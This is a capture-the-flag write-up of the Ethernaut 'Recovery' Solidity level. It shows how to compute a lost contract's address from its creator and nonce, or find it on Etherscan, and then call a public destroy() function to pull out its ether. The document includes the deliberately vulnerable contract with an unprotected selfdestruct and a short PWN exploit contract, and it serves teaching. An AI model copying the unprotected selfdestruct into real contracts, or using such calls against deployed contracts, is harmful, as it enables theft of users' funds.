![](https://ethernaut.openzeppelin.com/imgs/BigLevel17.svg)

A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent `0.001` ether to obtain more tokens. They have since lost the contract address.

This level will be completed if you can recover (or remove) the `0.001` ether from the lost contract address.

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

Solution:
## Analysis

```sol
function destroy(address payable _to) public {
    selfdestruct(_to);
}
```

As it is evident from the question, we need to find the lost contract address. Once this is found, we can just call the `destroy()` function on the contract to withdraw the funds since the visibility is set to `public`. Let's derive the lost address.

### Method 1 - Using the Formula

According to the Ethereum Yellow Paper -

> The address of the new account is defined as being the rightmost 160 bits of the Keccak hash of the RLP encoding of the structure containing only the sender and the account nonce.

This means that the new address will be the rightmost 160 bits of the keccak256 hash of RLP encoding of sender/creator_address and their nonce.

- sender address - It is the address that created the contract.
- nonce - It is the number of contracts created by the factory contract or if it's an EOA, it will be the number of transactions by that account. In this case, it will be 1 assuming it is the first contract created by the factory.
- RLP - The purpose of RLP is to encode arbitrarily nested arrays of binary data, and RLP is the primary encoding method used to serialize objects in Ethereum's execution layer.
    - RLP for 20 byte address will be `0xd6, 0x94` according to the following sources: [here](https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed), and [here](https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp).
    - RLP encoding for nonce 1 will be `0x01` because for all values under [0x00, 0x7f] (decimal [0, 127]) range, that byte is its own RLP encoding.

Now that we know the above values, we can calculate the first address created by the factory contract as:

```sol
address lostcontract = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(<creator_address>), bytes1(0x01))))));
```


### Method 2 - Using Etherscan

This is preferably the easiest method as you won't need to know any calculations and formulas to find the address because the block explorer will show it to you.

Go to [Etherscan](https://rinkeby.etherscan.io/address/0xd89bEAe5D371Bc79754623f7f789a395F3D83b3C#internaltx) and enter the instance address in the search field and look inside the internal transactions.

The transaction flow can be seen creating another contract from the address of the first one.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1661699195981/-G3j7Oupr.png?auto=compress,format&format=webp)

This is the address that was lost containing 0.001 Ether stored in it:

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1661699266801/CsUVwGwgd.png?auto=compress,format&format=webp)

---
Exploit:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISimpleToken {
  function destroy(address payable _to) external;
}

contract PWN {
  address tmp = 0xF5F460bc4Ac4BAF00C0d6660c6E862c45A5204cb;
  function pwn() external {
    ISimpleToken Itmp = ISimpleToken(tmp);
    Itmp.destroy(payable(0x095454F216EC9485da86D49aDffAcFD0Fa3e5BE5));
  }
}

```

___
Contract addresses are deterministic and are calculated by `keccak256(address, nonce)` where the `address` is the address of the contract (or ethereum address that created the transaction) and `nonce` is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).

Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.

An interesting [blog post](https://swende.se/blog/Ethereum_quirks_and_vulns.html) by Martin Swende details potential use cases of this.

If you're going to implement this technique, make sure you don't miss the nonce, or your funds will be lost forever.